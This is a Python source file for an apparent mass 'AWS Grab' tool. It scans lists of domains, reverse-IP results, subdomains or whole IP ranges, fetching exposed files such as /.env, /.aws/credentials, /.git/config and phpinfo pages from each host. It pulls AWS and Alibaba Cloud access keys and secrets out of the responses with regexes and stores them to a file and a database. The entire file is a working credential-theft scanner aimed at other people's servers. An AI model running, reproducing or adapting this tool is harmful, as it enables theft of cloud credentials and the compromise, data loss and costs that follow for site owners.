﻿# coding=utf-8
# AUTHOR : RIDHO
import urllib3
import os,sys,time,requests,re,socket,json,pymongo,colorama
from requests.exceptions import ConnectionError
from bs4 import BeautifulSoup as scrape
from multiprocessing.dummy import Pool
from ipaddress import IPv4Address, summarize_address_range
from netaddr import IPNetwork # for ip cidr
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

from rich.panel import Panel
from rich import print as prints

from threading import *
from threading import Thread
try:
    from queue import Queue
except:
    from Queue import Queue
lock = Lock()
colorama.init(autoreset=True)

if os.name == 'nt':
    os.system('mode con cols=65 lines=35')
configg = {
    "use_database":"no",
    "save_domain":"no",
    "save_ip_address":"no",
    "save_subdomain":"yes",
    "enable_custom_port":"yes",
    "timeout_requests":"15",
    "save_key_aws":"yes",
    "save_phpinfo":"yes",
    "port_kostum":"80,443,8080,8443" #4343,8080,9200,"
}


class Worker(Thread):
    def __init__(self, tasks):
        Thread.__init__(self)
        self.tasks = tasks
        self.daemon = True
        self.start()

    def run(self):
        while True:
            func, args, kargs = self.tasks.get()
            try:
                func(*args, **kargs)
            except Exception as e:
                print(e)
            self.tasks.task_done()


class ThreadPool:
    def __init__(self, num_threads):
        self.tasks = Queue(num_threads)
        for _ in range(num_threads): Worker(self.tasks)

    def add_task(self, func, *args, **kargs):
        self.tasks.put((func, args, kargs))

    def wait_completion(self):
        self.tasks.join()

banner = """\x1b[1;97m
     \x1b[1;97m.__..  . __.  \x1b[1;91m.__ .__ .__..__ .__ .___.__ 
     \x1b[1;97m[__]|  |(__   \x1b[1;91m[ __[__)[__][__)[__)[__ [__)
     \x1b[1;97m|  ||/\|.__)  \x1b[1;91m[_./|  \|  |[__)[__)[___|  \\
                \x1b[95m∆\x1b[1;92m AUTHOR \x1b[1;91m: \x1b[1;92mRIDHO \x1b[95m∆\x1b[0m
                \x1b[95m∆\x1b[1;92m VERSION \x1b[1;91m: \x1b[1;92m2.5  \x1b[95m∆\x1b[0m

-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
"""
menu = """
[blue]1[/][red].[/] Aws Grab
[blue]2[/][red].[/] Subdomain [bold green]+[/] Aws Grab [green]([/] [yellow]domain only[/] [green])[/]
[blue]3[/][red].[/] Reverse Ip [bold green]+[/] Aws Grab [green]([/] [yellow]ip only[/] [green])[/]
[blue]4[/][red].[/] Reverse Ip [bold green]+[/] Subdomain + Aws Grab [green]([/] [yellow]ip only[/] [green])[/]
[blue]5[/][red].[/] IP RANGE + Aws Grab
"""
#exit(banner)

jangan_kosong = "(\x1b[1;93m!\x1b[0m) \x1b[1;93mJANGAN KOSONG!\x1b[0m"
keluar = "\n\n[\x1b[1;91mEXIT\x1b[0m] Good Bye ~"
path = [
    '/',
    '/.env',
    '/.env.txt',
    '/.env.example',
    '/.env.old',
    '/env.js',
    '/.aws/credentials',
    '/frontend_dev.php/$',
    '/phpinfo',
    '/tmp/phpinfo.php',
    '/phpinfo/phpinfo.php',
    '/php-info.php',
    '/pinfo.php',
    '/phpinfo.php',
    '/configs/s3_config.json',
    '/s3cmd.ini',
    '/wp-config.php.bak',
    '/settings.php.bak',
    '/configs/application.ini',
    '/src/phpinfo.php',
    '/temp.php',
    '/linusadmin-phpinfo.php',
    '/php.php',
    '/.env.bak',
    '/info.php',
    '/config/aws.yml',
    '/_profiler/phpinfo',
    '/_profiler/phpinfo.php',
    '/.env.dev.local',
    '/infos.php',
    '/php_info.php',
    '/app_dev.php/_profiler/phpinfo',
    '/.git/config',
    '/configuration.php-dist',
    #'/.aws/config',
    '/.config',
    '/config.json',
    '/debug/default/view?panel=config',
    '/web/debug/default/view?panel=config',
    '/frontend/web/debug/default/view?panel=config',
    '/_ignition/health-check',
    '/.circleci/config.yml'
]

head = 'Mozilla/5.0 (Linux; Android 10; Pixel Build/QP1A.190711.019; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.132 Mobile Safari/537.36'

# AWS Keys
KEY = '(?<![A-Z0-9])[A-Z0-9]{20}(?![A-Z0-9])'
SECRET = '(?<![A-Za-z0-9/+=])[A-Za-z0-9/+=]{40}(?![A-Za-z0-9/+=])'

# Alibaba Cloud Keys
ALIBABA_KEY = '(?<![A-Z0-9])LTAI[0-9a-zA-Z]{16}(?![A-Z0-9])'
ALIBABA_SECRET = '(?<![A-Za-z0-9])[0-9a-zA-Z]{30}(?![A-Za-z0-9])'

def clean():
    os.system('cls' if os.name == 'nt' else 'clear')

def variable_ada(ojol):
    return ( True if ojol in locals() else False )
def request_exception(yt,proto=False,path=False):
    if proto:
        for my_port in proto.split(','):
            purl = 'http://'+yt+':'+my_port+path
            print(purl)
            try:
                wr = requests.get(purl,timeout=int(configg['timeout_requests']),headers={'User-Agent':head},verify=False)
                print(wr.url)
                return wr
            #except:
            #    return False
            except Exception as eee:
                print(eee)
        return False


class Myhome:
    def __init__(self):
        self.timeout = int(configg['timeout_requests'])
        self.loop = 0
        if configg['use_database'].lower()=='no':
            self.client = pymongo.MongoClient('mongodb://127.0.0.1')
            self.database = self.client['database']
            self.koleksi_domain = self.database['all_domain']
            self.koleksi_subdomain = self.database['all_subdomain']
            self.koleksi_key_aws = self.database['all_keys_aws']
            self.koleksi_ipaddress = self.database['ip_address']
        self.all_keys = []
        self.main_menu()
    def print_lock(self,vv):
        lock.acquire()
        print(vv)
        lock.release()
    def subdomain(self,_url):
        try:
            __url = _url.replace('http://','').replace('https://','')
            ot = requests.get(f'https://sonar.omnisint.io/subdomains/{__url}').json()
            if "error" in ot or len(ot)==0:
                return False
            else:
                return ot
        except:
            return False
    def reverse(self,pup):
        masmas = []
        if self.select_api_reverse == 'alienvault':
            try:
                page = 1
                while True:
                    rurl = 'https://otx.alienvault.com/api/v1/indicators/IPv4/{}/url_list?page='
                    rurl = rurl.replace('?page=',f'?page={page}')
                    #print(rurl.format(pup))
                    ntol = requests.get(rurl.format(pup)).json()
                    if 'Invalid IP' in str(ntol) or "'url_list': []" in str(ntol):
                        break
                    else:
                        if int(ntol['limit'])==page:
                            break
                        else:
                            page+=1
                            for aswdah in ntol['url_list']:
                                if 'hostname' in aswdah:
                                    menmen = aswdah['hostname'].replace('www.','')
                                    #print(menmen)
                                    if not menmen in masmas:
                                        masmas.append(menmen)
                if len(masmas) != 0:
                    return masmas
                else:
                    return False
            except Exception as b1:
                #exit(b1)
                return False
        elif self.select_api_reverse == 'sonar':
            try:
                rurl = 'https://sonar.omnisint.io/reverse/{}'
                gogo = requests.get(rurl.format(pup)).json()
                if 'error' in gogo or '>' in gogo or '<' in gogo:
                    return False
                else:
                    return gogo
            except Exception as b2:
                print(b2)
                return False
    def find_key(self,object):
        object_key = []
        object_secret = []
        found_keys = {'aws': False, 'alibaba': False}
        
        # AWS Keys
        if 'AKIA' in object:
            nyari_key = re.findall(KEY,object)
            for each in nyari_key:
                if each == '':
                    pass
                else:
                    if each.startswith('AKIA'):
                        if not each in object_key:
                            object_key.append(each)
                            try:
                                for sec in re.findall(SECRET,object):
                                    if not sec in object_secret:
                                        object_secret.append(sec)
                            except:
                                try:
                                    for sec in re.findall('ses_secretkey=(.*)?\n',object):
                                        if not sec in object_secret:
                                            object_secret.append(sec)
                                except:
                                    pass
                        else:
                            pass
                    else:
                        pass
            if len(object_key) > 0:
                found_keys['aws'] = {'KEY': object_key, 'SECRET': object_secret if len(object_secret) > 0 else False}
        
        # Reset for Alibaba check
        object_key = []
        object_secret = []
        
        # Alibaba Cloud Keys
        if 'LTAI' in object:
            alibaba_keys = re.findall(ALIBABA_KEY, object)
            for key in alibaba_keys:
                if key and not key in object_key:
                    object_key.append(key)
                    # Find corresponding secret
                    alibaba_secrets = re.findall(ALIBABA_SECRET, object)
                    for secret in alibaba_secrets:
                        if secret and not secret in object_secret:
                            object_secret.append(secret)
            
            if len(object_key) > 0:
                found_keys['alibaba'] = {'KEY': object_key, 'SECRET': object_secret if len(object_secret) > 0 else False}
        
        # Return results
        if found_keys['aws'] or found_keys['alibaba']:
            return found_keys
        else:
            return False

    def simpan_hasil(self,hurra):
        # Handle AWS keys
        if 'aws' in hurra and hurra['aws']:
            for ss in range(len(hurra['aws']['KEY'])):
                if hurra['aws']['SECRET']==False:
                    _save = f"[AWS] {hurra['url']}|{hurra['aws']['KEY'][ss]}\n"
                else:
                    try:
                        _save = f"[AWS] {hurra['url']}|{hurra['aws']['KEY'][ss]}|{hurra['aws']['SECRET'][ss]}\n"
                    except IndexError:
                        _save = f"[AWS] {hurra['url']}|{hurra['aws']['KEY'][ss]}\n"

                if configg['save_key_aws'].lower()=='yes' and self.db[0]=='mongodb':
                    if bool(self.koleksi_key_aws.find_one({'key':hurra['aws']['KEY'][ss]})):
                        pass
                    else:
                        open('result.txt','a').write(_save)
                        self.koleksi_key_aws.insert_one({'key':hurra['aws']['KEY'][ss]})
                else:
                    if not hurra['aws']['KEY'][ss] in self.all_keys:
                        self.all_keys.append(hurra['aws']['KEY'][ss])
                        open('result.txt','a').write(_save)
        
        # Handle Alibaba keys
        if 'alibaba' in hurra and hurra['alibaba']:
            for ss in range(len(hurra['alibaba']['KEY'])):
                if hurra['alibaba']['SECRET']==False:
                    _save = f"[ALIBABA] {hurra['url']}|{hurra['alibaba']['KEY'][ss]}\n"
                else:
                    try:
                        _save = f"[ALIBABA] {hurra['url']}|{hurra['alibaba']['KEY'][ss]}|{hurra['alibaba']['SECRET'][ss]}\n"
                    except IndexError:
                        _save = f"[ALIBABA] {hurra['url']}|{hurra['alibaba']['KEY'][ss]}\n"

                if configg['save_key_aws'].lower()=='yes' and self.db[0]=='mongodb':
                    if bool(self.koleksi_key_aws.find_one({'key':hurra['alibaba']['KEY'][ss]})):
                        pass
                    else:
                        open('result.txt','a').write(_save)
                        self.koleksi_key_aws.insert_one({'key':hurra['alibaba']['KEY'][ss]})
                else:
                    if not hurra['alibaba']['KEY'][ss] in self.all_keys:
                        self.all_keys.append(hurra['alibaba']['KEY'][ss])
                        open('result.txt','a').write(_save)

    def kondisi_target(self,xxx,type):
        #target = xxx
        if configg['use_database'].lower()=='yes':
            if configg['save_domain'].lower()=='yes' and type=='domain':
                if xxx.replace('.','').isnumeric():
                    if configg['save_ip_address'].lower()=='yes':
                        if bool(self.koleksi_ipaddress.find_one({'ip':xxx})):
                            return False
                        else:
                            self.koleksi_ipaddress.insert_one({'ip':xxx})
                            return xxx
                    else:
                        return xxx
                else:
                    if bool(self.koleksi_domain.find_one({'domain':xxx})):
                        return False
                    else:
                        self.koleksi_domain.insert_one({'domain':xxx})
                        return xxx
            elif configg['save_subdomain'].lower()=='yes' and type=='subdomain':
                if bool(self.koleksi_subdomain.find_one({'subdomain':xxx})):
                    return False
                else:
                    self.koleksi_subdomain.insert_one({'subdomain':xxx})
                    return xxx
            else:
                return xxx
        else:
            return xxx
    def while2(self,_target):
        ngent = _target.replace('http://','').replace('https://','').replace('/','')
        if configg['enable_custom_port']=='yes':
            for way_port in configg['port_kostum'].split(','):
                try:
                    ttt = 'http://'+ngent+':'+way_port
                    wy = requests.get(ttt,verify=False,timeout=10)
                    ngent = ttt
                    break
                except:
                    pass
        try:
           for ppath in path:
                gabung = f"{ngent}{ppath}"
                rrq = requests.get(gabung,headers={'User-Agent':head},timeout=self.timeout).text
                if configg['save_phpinfo']=='yes':
                    if 'phpinfo()' in rrq:
                        open('phpinfo.txt','a').write(gabung+'\n')
                #rrq = request_exception(ngent,proto=configg['port_kostum'],path=ppath)
                if rrq:
                    helpme  = self.find_key(rrq)
                    if helpme:
                        payloadd = {'url':gabung}
                        if 'aws' in helpme and helpme['aws']:
                            payloadd['aws'] = helpme['aws']
                        if 'alibaba' in helpme and helpme['alibaba']:
                            payloadd['alibaba'] = helpme['alibaba']
                        
                        self.simpan_hasil(payloadd)
                        
                        # Print found keys
                        if 'aws' in helpme and helpme['aws']:
                            if helpme['aws']['SECRET']:
                                print("\x1b[1;96m{}\x1b[0m \x1b[1;92m{}|AWS|{}|{}\x1b[0m".format(
                                    self.loop, payloadd['url'], helpme['aws']['KEY'], helpme['aws']['SECRET']))
                            else:
                                print("\x1b[1;96m{}\x1b[0m \x1b[1;92m{}|AWS|{}\x1b[0m".format(
                                    self.loop, payloadd['url'], helpme['aws']['KEY']))
                        
                        if 'alibaba' in helpme and helpme['alibaba']:
                            if helpme['alibaba']['SECRET']:
                                print("\x1b[1;96m{}\x1b[0m \x1b[1;92m{}|ALIBABA|{}|{}\x1b[0m".format(
                                    self.loop, payloadd['url'], helpme['alibaba']['KEY'], helpme['alibaba']['SECRET']))
                            else:
                                print("\x1b[1;96m{}\x1b[0m \x1b[1;92m{}|ALIBABA|{}\x1b[0m".format(
                                    self.loop, payloadd['url'], helpme['alibaba']['KEY']))
                        
                        break
                    else:
                        with lock:
                            print(f"\x1b[1;96m{self.loop}\x1b[0m {gabung} \x1b[1;91mNOT FOUND\x1b[0m")
        except Exception as p2:
            print(f"\x1b[1;96m{self.loop}\x1b[0m {ngent} \x1b[1;93mERROR\x1b[0m")
    def for_looping(self,xx):
        self.loop += 1
        yuhu = xx
        if self.kondisi_target(yuhu,'domain'):
            if self.mode == 'normal':
                self.while2(yuhu)
            elif self.mode == 'reverse_aws':
                mamang = self.reverse(yuhu)
                if mamang:
                    for ww in mamang:
                        if self.kondisi_target(ww,'domain'):
                            self.while2(ww)
                else:
                    pass
            elif self.mode == 'subdomain_aws':
                hadehh = self.subdomain(yuhu)
                if hadehh:
                    for subdomenn in hadehh:
                        maen = subdomenn.replace('www.','').replace('mail.','').replace('cpanel.','').replace('cpcontacts.','').replace('webdisk.','').replace('autodiscover.','')
                        if self.kondisi_target(maen,'subdomain'):
                            self.while2(maen)
                else:
                    pass
            elif self.mode == 'reverse_subdomain_aws':
                gokill = self.reverse(yuhu)
                if gokill:
                    for hasilrev in gokill:
                        if self.kondisi_target(hasilrev,'domain'):
                            mainsub = self.subdomain(hasilrev)
                            if mainsub:
                                for mainsub2 in mainsub:
                                    #print(mainsub2)
                                    self.while2(mainsub2)
                            else:
                                pass
                        else:
                            pass
                else:
                    pass
    def put(self):
        self.db = ['mongodb' if configg['use_database'].lower()=='yes' else 'biasa']
        #exit(self.db)
        #self.timeout = 12
        while True:
            clean()
            print(banner)
            try:
                delist = open(input("# Masukan List : "),'r',encoding='UTF-8').read().splitlines()
                self.total = len(delist)
                if delist == "":
                    print(jangan_kosong)
                    time.sleep(1)
                else:
                    break
            except (KeyboardInterrupt,EOFError):
                exit(keluar)
            except FileNotFoundError:
                prints("\n([bold red]X[/]) [bold cyan]File Tidak Ditemukan[/]")
                time.sleep(2)
        mythread = int(input("# Masukan Thread : "))
        mythread = ThreadPool(mythread)
        if self.mode == 'reverse_subdomain_aws':
            self.mode = 'subdomain_aws'
            for ngok in delist:
                try:
                    revv = self.reverse(ngok)
                    if revv:
                        for ngrevv in revv:
                            mythread.add_task(self.for_looping,ngrevv)
                except Exception as kecuali:
                    print(kecuali)
            mythread.wait_completion()
        else:
            for ngok in delist:
                mythread.add_task(self.for_looping,ngok)
            mythread.wait_completion()
        """
        for i in delist:
            try:
                self.mythread.add_task(self.for_looping,i)
            except (KeyboardInterrupt,EOFError):
                exit(keluar)
        self.mythread.wait_completion()
        """
    def main_menu(self):
        clean()
        print(banner)
        #if kondisi_untuk_config(configg['use_database']) == False:
        #    prints(Panel(f"\t\t[bold cyan]USE DATABASE[/] : [bold red]{configg['use_database'].upper()}[/]",title='CONFIG DATABASE'))
        #else:
        #    prints(Panel(syah,title='CONFIG DATABASE'))
        prints(Panel(menu,title="MENU"))
        try:
            pilih = str(input('# Pilih : '))
        except (KeyboardInterrupt,EOFError):
            exit(keluar)
        if pilih == '1' or pilih == '1':
            self.mode = 'normal'
            self.put()
        elif pilih == '2' or pilih == '02':
            self.mode = 'subdomain_aws'
            self.put()
        elif pilih == '3' or pilih == '03':
            self.mode = 'reverse_aws'
            self.select_api_reverse = 'sonar'
            self.put()
        elif pilih == '4' or pilih == '04':
            self.select_api_reverse = 'sonar'
            self.mode = 'reverse_subdomain_aws'
            self.put()
        elif pilih == '5' or pilih == '05':
            self.mode = 'normal'
            clean()
            print(banner)
            prints(Panel("[bold green]first[/] [bold red]:[/] 192.1.1.1 | [bold green]last[/] [bold red]:[/] 192.255.255.255",title="[bold yellow]EXAMPLE[/]"))
            first = input("# First : ")
            last = input("# Last : ")
            thred = ThreadPool(int(input("# Thread : ")))
            f_ip = IPv4Address(first)
            l_ip = IPv4Address(last)
            a="\n".join(map(str, summarize_address_range(f_ip, l_ip)))
            for cidr in a.split('\n'):
                for range_ip in IPNetwork(cidr):
                    thred.add_task(self.for_looping,str(range_ip))
            thred.wait_completion()

        else:
            print("\x1b[1;96m[\x1b[1;91mx\x1b[1;96m] \x1b[0mPILIH YANG BENER BANGG\x1b[1;93m!!\x1b[0m")
            time.sleep(2)
            self.main_menu()


Myhome()